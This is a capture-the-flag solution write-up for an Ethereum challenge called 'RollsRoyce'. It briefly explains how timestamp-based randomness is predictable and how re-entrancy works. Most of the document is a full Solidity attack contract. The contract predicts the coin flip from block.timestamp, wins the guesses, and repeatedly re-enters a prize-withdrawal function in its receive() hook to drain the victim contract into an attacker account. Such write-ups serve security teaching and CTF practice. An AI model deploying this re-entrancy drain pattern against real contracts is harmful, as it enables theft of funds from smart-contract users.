# RollsRoyce - Solution

**Author**: AtlanticBase

**Category**: Ethereum

This challenge is about the insecurities of Randomness in the Ethereum Blockchain and Re-entrancy.

It is not secure if you use the timestamp as attackers can 'predict' the blocks. This is a problem. In order to guess the attack, run the `CoinFlip` function
and then guess at the same time and you will be able to get the answer.

Now, after that, you can then use Re-entrancy to drain the contract address and get the funds.

```javascript

//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

enum CoinFlipOption {
        HEAD,
        TAIL
}

interface IRollsRoyce {
    function guess(CoinFlipOption _guess) external payable;
    function revealResults() external;
    function withdrawFirstWinPrizeMoneyBonus() external;
}

contract RollsRoyceAttack {

    RollsRoyce rr;
    event Received(address, uint);

    constructor() {
        rr = RollsRoyce(payable([CONTRACT ADDRESS]));
    }

    function guessAttack() public payable {
        for(uint i=0; i<3; i++){
            CoinFlipOption ans = CoinFlipOption(uint(keccak256(abi.encodePacked((block.timestamp) ^ 0x1F2DF76A6))) % 2);
            rr.guess{value: 1 ether}(ans);
            rr.revealResults();
        }
    }

    function withdrawAttack() external payable {
        rr.withdrawFirstWinPrizeMoneyBonus();
    }

    receive() external payable {
        if (address([CONTRACT ADDRESS]).balance > 0) {
            rr.withdrawFirstWinPrizeMoneyBonus();
            console.log("reentering...");
            emit Received(msg.sender, msg.value);
        } else {
            console.log('victim account drained');
            payable([EOA ACCOUNT]).transfer(address(this).balance);
        }
  }

  function viewBalance() public view returns (uint) {
      return address(this).balance;
  }
}

```
